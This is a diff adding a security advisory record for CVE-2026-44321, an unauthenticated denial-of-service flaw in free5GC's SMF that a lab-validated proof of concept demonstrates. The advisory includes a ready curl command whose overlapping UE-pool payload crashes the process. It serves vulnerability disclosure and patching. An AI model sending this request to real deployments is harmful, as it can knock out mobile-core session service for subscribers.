@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-44qj-cghf-9p97",
+  "modified": "2026-05-08T23:01:24.601700Z",
+  "published": "2026-05-08T22:47:24Z",
+  "aliases": [
+    "CVE-2026-44321"
+  ],
+  "summary": "free5GC's SMF UPI POST /upi/v1/upNodesLinks exits the SMF process on overlapping UE pools (unauthenticated, reachable Fatalf)",
+  "details": "### Summary\nfree5GC's SMF mounts the `UPI` management route group without inbound OAuth2 middleware (same root cause as free5gc/free5gc#887). The `POST /upi/v1/upNodesLinks` create-or-update handler accepts attacker-controlled JSON and passes it directly into `UpNodesFromConfiguration()`, which calls `logger.InitLog.Fatalf(...)` on several validation failures. One confirmed path is the UE-IP-pool overlap check: a single unauthenticated POST that adds a new UPF whose pool overlaps an existing UPF terminates the entire SMF process (`docker ps` shows `Exited (1)`), not just the goroutine. This is a stronger sink than free5gc/free5gc#905: that one panics inside the request goroutine and Gin recovers; this one calls `Fatalf` which is `os.Exit(1)`-equivalent and kills the whole SMF process, dropping all of SMF's SBI surface (PDU-session establishment, UE policy lookups, etc.) until the process is restarted.\n\n### Details\nValidated against the SMF container in the official Docker compose lab.\n- Source repo tag: `v4.2.1`\n- Running Docker image: `free5gc/smf:v4.2.1`\n- Runtime SMF commit: `8385c00a`\n- Docker validation date: 2026-03-22 local (container log timestamp `2026-03-21T23:47:07Z`)\n- SMF endpoint: `http://10.100.200.6:8000`\n\nThe broader `UPI` auth gap (#887) lets the unauthenticated POST reach the create/update handler. From there:\n\nVulnerable handler dispatches into topology parsing:\n```\nPOST /upi/v1/upNodesLinks\n -\u003e UpNodesFromConfiguration()\n   -\u003e isOverlap(allUEIPPools)\n     -\u003e logger.InitLog.Fatalf(\"overlap cidr value between UPFs\")\n```\n\nCode evidence (paths in `free5gc/smf`):\n- UPI group mounted WITHOUT auth middleware (preconditions for unauthenticated reachability):\n  - `NFs/smf/internal/sbi/server.go:76`\n  - `NFs/smf/internal/sbi/server.go:78`\n- Create-or-update handler accepts attacker JSON and forwards it to `UpNodesFromConfiguration()`:\n  - `NFs/smf/internal/sbi/api_upi.go:60`\n  - `NFs/smf/internal/sbi/api_upi.go:72`\n- Pool parsing (input from attacker JSON):\n  - `NFs/smf/internal/context/user_plane_information.go:413`\n- Overlap check that calls `Fatalf`:\n  - `NFs/smf/internal/context/user_plane_information.go:479`\n\nThe same unauthenticated POST path also reaches sibling `Fatalf` calls for invalid-pool and static-pool-exclusion failures, so this is not a one-off code smell -- it is a class of attacker-reachable `Fatalf` call sites on a single unauthenticated handler:\n- `NFs/smf/internal/context/user_plane_information.go:416`\n- `NFs/smf/internal/context/user_plane_information.go:424`\n- `NFs/smf/internal/context/user_plane_information.go:430`\n\n### PoC\nReproduced end-to-end against the running SMF at `http://10.100.200.6:8000`.\n\n1. Trigger: unauthenticated POST that adds a UPF with a UE pool overlapping the default UPF (`10.60.0.0/16`):\n```\ncurl -i -X POST http://10.100.200.6:8000/upi/v1/upNodesLinks \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"links\":[{\"A\":\"gNB1\",\"B\":\"UPF-OVERLAP-20260322\"}],\"upNodes\":{\"UPF-OVERLAP-20260322\":{\"type\":\"UPF\",\"nodeID\":\"198.51.100.20\",\"addr\":\"198.51.100.20\",\"sNssaiUpfInfos\":[{\"sNssai\":{\"sst\":1,\"sd\":\"010203\"},\"dnnUpfInfoList\":[{\"dnn\":\"internet\",\"pools\":[{\"cidr\":\"10.60.0.0/16\"}]}]}]}}}'\n```\n\nClient-side observation (server died mid-request, no HTTP response written):\n```\ncurl: (52) Empty reply from server\n```\n\n2. Confirm the SMF container exited:\n```\ndocker ps -a --filter name=smf --format '{{.Names}}\\t{{.Status}}'\n```\n```\nsmf    Exited (1) 9 seconds ago\n```\n\n3. SMF container logs (`docker logs --tail 80 smf`) show the `FATA` line that terminated the process:\n```\n[FATA][SMF][Init] overlap cidr value between UPFs\n```\n\n### Impact\nUnauthenticated process-kill DoS on the SMF management plane.\n\n1. Missing inbound authentication (CWE-306) and authorization (CWE-862) on the `UPI` route group makes the trigger reachable to any off-path network attacker who can reach SMF on the SBI -- no token, no UE state needed. The same-instance `nsmf-oam` returning `401` (see free5gc/free5gc#887) proves OAuth middleware is wired in for other SMF route groups and only missing on UPI.\n2. Reachable assertion / fail-fast (CWE-617): topology parsing calls `logger.InitLog.Fatalf(...)` on attacker-influenced validation failures. `Fatalf` is `os.Exit(1)`-equivalent -- it skips Gin's recovery, the deferred handlers, and kills the whole SMF process. This is materially worse than the related panic-DoS in free5gc/free5gc#905, which Gin recovers from at the goroutine level.\n\nAny party that can reach SMF on the SBI can:\n- Send one unauthenticated POST with an overlapping UE pool and immediately terminate the SMF process, dropping all of SMF's SBI surface (PDU-session establishment, UE policy interactions) until SMF is restarted.\n- Repeat the trigger after every restart to sustain the outage.\n- Use sibling `Fatalf` paths (invalid-pool, static-pool exclusion) to sustain the same DoS even if the overlap check is hardened in isolation, because the underlying defect is using `Fatalf` for request-time validation on an unauthenticated handler.\n\nNo Confidentiality impact (the crash returns no data to the attacker). No persistent Integrity impact (the topology updates are in-memory and are lost when SMF dies). The whole impact concentrates in Availability: complete loss of SMF service via a single unauthenticated request.\n\nAffected: free5gc v4.2.1.\n\nUpstream issue: https://github.com/free5gc/free5gc/issues/906\nUpstream fix: https://github.com/free5gc/smf/pull/203",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/free5gc/smf",
+        "purl": "pkg:golang/github.com/free5gc/smf"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.4.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-44qj-cghf-9p97/GHSA-44qj-cghf-9p97.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/security/advisories/GHSA-44qj-cghf-9p97"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/issues/906"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/smf/pull/203"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/smf/commit/e0974e07ddab44a67d36a563cca383b2449e33e5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/free5gc/free5gc"
+    }
+  ]
+}
